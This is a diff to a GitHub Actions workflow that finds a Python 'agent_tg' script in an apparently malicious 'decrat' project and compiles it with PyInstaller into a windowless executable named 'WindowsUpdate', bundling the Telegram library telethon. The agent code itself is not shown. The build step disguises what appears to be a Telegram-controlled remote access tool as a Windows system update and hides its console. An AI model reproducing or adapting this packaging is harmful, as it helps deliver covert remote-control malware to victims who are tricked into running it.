@@ -22,9 +22,25 @@ jobs:
         run: |
           pip install pyinstaller requests telethon
 
-      - name: Build EXE
+      - name: Find and build agent
+        shell: pwsh
         run: |
-          pyinstaller --onefile --noconsole --name="WindowsUpdate" --hidden-import=telethon --hidden-import=telethon.sync --hidden-import=telethon.sessions --collect-all telethon decrat/agent_tg_v2.py
+          # find agent file wherever it is
+          $file = Get-ChildItem -Recurse -Filter "agent_tg_v2.py" | Select-Object -First 1
+          if (-not $file) {
+            $file = Get-ChildItem -Recurse -Filter "agent_tg.py" | Select-Object -First 1
+          }
+          if (-not $file) {
+            Write-Error "No agent file found in repo"
+            exit 1
+          }
+          Write-Host "Found: $($file.FullName)"
+          pyinstaller --onefile --noconsole --name="WindowsUpdate" `
+            --hidden-import=telethon `
+            --hidden-import=telethon.sync `
+            --hidden-import=telethon.sessions `
+            --collect-all telethon `
+            "$($file.FullName)"
 
       - name: Get version tag
         id: version
